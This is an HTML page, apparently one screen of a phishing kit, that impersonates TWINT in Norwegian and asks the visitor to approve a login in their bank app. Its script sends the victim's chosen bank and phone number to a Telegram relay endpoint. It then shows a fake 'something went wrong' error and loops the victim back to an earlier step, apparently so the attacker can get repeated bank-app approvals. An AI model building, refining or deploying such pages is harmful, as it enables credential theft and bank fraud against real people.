<!DOCTYPE html>
<html lang="nb">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>TWINT — Bekreft i bankapp</title>
    <style>
      :root {
        font-family: "Inter", "Segoe UI", system-ui, sans-serif;
        color: #0f172a;
        background: #f3f4f6;
      }

      * {
        box-sizing: border-box;
      }

      body {
        margin: 0;
        min-height: 100vh;
        background: #f3f4f6;
        display: flex;
        justify-content: center;
        align-items: center;
        padding: 0;
      }

      .shell {
        width: min(420px, 100%);
        background: white;
        border-radius: 0;
        padding: 1.5rem 1.75rem;
        min-height: 100vh;
        box-shadow: 0 15px 45px rgba(15, 23, 42, 0.18);
        display: flex;
        flex-direction: column;
      }

      .step {
        display: flex;
        flex-direction: column;
        gap: 0.45rem;
        padding: 0 0.25rem 0.75rem;
      }

      .step-label {
        font-size: 0.8rem;
        letter-spacing: 0.08em;
        text-transform: uppercase;
        color: #94a3b8;
      }

      .step-progress {
        display: flex;
        align-items: center;
        justify-content: space-between;
      }

      .progress-bar {
        flex: 1;
        height: 0.35rem;
        background: #e2e8f0;
        border-radius: 999px;
        margin-right: 0.75rem;
        overflow: hidden;
      }

      .progress-bar span {
        display: block;
        width: 100%;
        height: 100%;
        background: #fbbf24;
        border-radius: inherit;
      }

      .step-progress strong {
        font-size: 0.75rem;
        color: #475569;
      }

      h1 {
        margin: 0 0 0.5rem;
        font-size: 1.75rem;
      }

      .copy {
        margin: 0 0 1.5rem;
        line-height: 1.6;
        color: #475569;
      }

      .instruction-box {
        background: #f8fafc;
        border: 1px solid #e2e8f0;
        border-radius: 14px;
        padding: 1.5rem;
        margin: 1rem 0;
        text-align: center;
      }

      .instruction-box h2 {
        margin: 0 0 0.75rem;
        font-size: 1.25rem;
        color: #0f172a;
      }

      .instruction-box p {
        margin: 0;
        color: #475569;
        line-height: 1.6;
      }

      .bank-name {
        color: #fbbf24;
        font-weight: 700;
        font-size: 1.1em;
      }

      .error-message {
        background: #fef2f2;
        border: 1px solid #fecaca;
        border-radius: 12px;
        padding: 1rem;
        margin: 1rem 0;
        color: #dc2626;
        font-weight: 600;
        text-align: center;
        display: none;
      }

      .error-message.show {
        display: block;
      }

      .buttons {
        display: flex;
        flex-direction: column;
        gap: 0.75rem;
        margin-top: auto;
        padding-top: 1.5rem;
      }

      .buttons button {
        border: none;
        border-radius: 14px;
        padding: 0.95rem;
        font-size: 1rem;
        font-weight: 600;
        cursor: pointer;
      }

      .primary {
        background: #fbbf24;
        color: #0f172a;
        box-shadow: 0 10px 20px rgba(251, 191, 36, 0.45);
      }

      .primary:disabled {
        background: #f6f8fb;
        color: #94a3b8;
        box-shadow: none;
        cursor: not-allowed;
      }

      .secondary {
        background: white;
        border: 1px solid #d1d5db;
        color: #475569;
      }
    </style>
  </head>
  <body>
    <div class="shell">
      <div class="step">
        <div class="step-label">Step 6/6</div>
        <div class="step-progress">
          <div class="progress-bar"><span style="width: 100%;"></span></div>
          <strong>Step 6/6</strong>
        </div>
      </div>

      <h1>Bekreft i bankapp</h1>
      <p class="copy">
        Åpne <span class="bank-name" id="bank-name">bankens app</span> på telefonen din og bekreft innloggingen.
      </p>

      <div class="instruction-box">
        <h2>Åpne <span class="bank-name" id="bank-name-box">bankens app</span></h2>
        <p>
          Gå til <span class="bank-name" id="bank-name-instruction">bankens app</span> på telefonen din og bekreft at du ønsker å logge inn på TWINT.
        </p>
      </div>

      <div class="error-message" id="error-message">
        Oops, noe gikk galt. Prøv igjen.
      </div>

      <div class="buttons">
        <button type="button" class="primary" id="next-button">Jeg har bekreftet</button>
        <button type="button" class="secondary" id="back-button">Tilbake</button>
      </div>
    </div>

    <script>
      const selectedBank = localStorage.getItem("selectedBank");
      const bankNameElements = document.querySelectorAll("#bank-name, #bank-name-box, #bank-name-instruction");
      const nextButton = document.getElementById("next-button");
      const backButton = document.getElementById("back-button");

      // Update bank name in all places
      if (selectedBank) {
        bankNameElements.forEach(el => {
          el.textContent = selectedBank + " app";
        });
      }

      const errorMessage = document.getElementById("error-message");

      // Helper function to send data to Telegram
      async function sendToTelegram(data) {
        try {
          await fetch('/api/telegram', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
          });
        } catch (error) {
          console.error('Error sending to Telegram:', error);
        }
      }

      nextButton.addEventListener("click", async () => {
        // Disable button to prevent multiple clicks
        nextButton.disabled = true;
        
        const phoneNumber = localStorage.getItem("phoneNumber");
        
        // Send bank app confirmation to Telegram
        await sendToTelegram({
          action: 'bank_app_confirmed',
          bank: selectedBank || null,
          phone: phoneNumber || null,
          timestamp: new Date().toISOString()
        });
        
        // Show error message
        errorMessage.classList.add("show");
        
        // Wait 5 seconds then redirect to screen-3.html
        setTimeout(() => {
          window.location.href = "screen-3.html";
        }, 5000);
      });

      backButton.addEventListener("click", () => {
        window.location.href = "screen-5.html";
      });
    </script>
  </body>
</html>
